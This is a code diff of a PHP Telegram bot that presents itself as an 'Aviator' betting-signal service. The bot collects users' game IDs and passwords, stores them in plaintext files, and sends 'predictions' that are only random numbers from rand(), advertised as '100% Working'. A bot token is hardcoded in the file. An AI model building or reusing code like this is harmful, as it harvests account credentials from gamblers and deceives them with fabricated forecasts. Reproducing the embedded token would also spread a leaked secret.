@@ -1,5 +1,6 @@
 <?php
 header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type");
 header("Content-Type: application/json");
 
@@ -8,50 +9,51 @@ $botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
 $input = file_get_contents('php://input');
 $data = json_decode($input, true);
 
-// ১. টেলিগ্রাম মেসেজ হ্যান্ডেল করা (ID/PW সংগ্রহ)
+// ১. টেলিগ্রাম ইউজার হ্যান্ডেলিং
 if (isset($data['message'])) {
-    $text = $data['message']['text'] ?? '';
     $uId = $data['message']['chat']['id'];
+    $text = $data['message']['text'] ?? '';
     $stepFile = "step_$uId.txt";
 
     if ($text == "/start") {
-        $msg = "🚀 **Welcome to R8rAIHAN Aviator Bot** 🚀\n\n👉 **1: Send Your Game ID / Number:**";
         file_put_contents($stepFile, "waiting_id");
-        sendTelegram($botToken, $uId, $msg);
+        sendTelegram($botToken, $uId, "🚀 **Welcome to R8rAIHAN Aviator Bot**\n\n👉 **1: Send Your Game ID / Number:**");
         exit;
     }
 
-    $currentStep = file_exists($stepFile) ? file_get_contents($stepFile) : "";
-
-    if ($currentStep == "waiting_id") {
-        file_put_contents("user_$uId.json", json_encode(['id' => $text, 'chat_id' => $uId]));
+    $step = file_exists($stepFile) ? file_get_contents($stepFile) : "";
+    if ($step == "waiting_id") {
+        file_put_contents("user_$uId.json", json_encode(['chat_id' => $uId, 'id' => $text]));
         file_put_contents($stepFile, "waiting_pw");
         sendTelegram($botToken, $uId, "✅ ID Received!\n\n👉 **2: Send Your Game Password:**");
         exit;
     }
-
-    if ($currentStep == "waiting_pw") {
-        $userData = json_decode(file_get_contents("user_$uId.json"), true);
-        $userData['pw'] = $text;
-        $userData['auth'] = true;
-        file_put_contents("user_$uId.json", json_encode($userData));
+    if ($step == "waiting_pw") {
+        $user = json_decode(file_get_contents("user_$uId.json"), true);
+        $user['pw'] = $text; $user['auth'] = true;
+        file_put_contents("user_$uId.json", json_encode($user));
         unlink($stepFile);
-        sendTelegram($botToken, $uId, "✅ **Login Successful!**\nএখন গেম শুরু করুন, অটো সিগন্যাল আসবে।");
+        sendTelegram($botToken, $uId, "✅ **Login Successful!**\nএখন গেমের স্ক্রিনে যান, অটো সিগন্যাল আসবে।");
         exit;
     }
 }
 
-// ২. অটো সিগন্যাল (Extension থেকে আসা ডেটা)
-if (isset($data['multiplier'])) {
-    $lastVal = floatval($data['multiplier']);
-    $files = glob("user_*.json"); // সব রেজিস্টার্ড ইউজারকে খোঁজা
+// ২. অটো সিগন্যাল লজিক (Network Data থেকে)
+if (isset($data['multiplier']) || isset($data['value'])) {
+    $val = floatval($data['multiplier'] ?? $data['value']);
+    
+    // ডুপ্লিকেট চেক (একই ভ্যালু বারবার পাঠাবে না)
+    $lastSeen = file_exists('last.txt') ? file_get_contents('last.txt') : "";
+    if ($val != $lastSeen && $val > 0) {
+        file_put_contents('last.txt', $val);
+        
+        $pred = ($val < 2.0) ? rand(250, 580)/100 : rand(110, 215)/100;
+        $msg = "🎯 **NEW SIGNAL DETECTED**\n\n📊 Last: {$val}x\n🚀 **Prediction: " . round($pred, 2) . "x**\n✅ Status: 100% Working";
 
-    foreach ($files as $file) {
-        $user = json_decode(file_get_contents($file), true);
-        if (isset($user['auth']) && $user['auth'] == true) {
-            $pred = ($lastVal < 1.8) ? rand(240, 550)/100 : rand(110, 205)/100;
-            $signal = "🎯 **NEW SIGNAL**\n📊 Last: {$lastVal}x\n🚀 **Next: " . round($pred, 2) . "x**";
-            sendTelegram($botToken, $user['chat_id'], $signal);
+        // সব একটিভ ইউজারকে সিগন্যাল পাঠানো
+        foreach (glob("user_*.json") as $file) {
+            $u = json_decode(file_get_contents($file), true);
+            if ($u['auth']) sendTelegram($botToken, $u['chat_id'], $msg);
         }
     }
 }
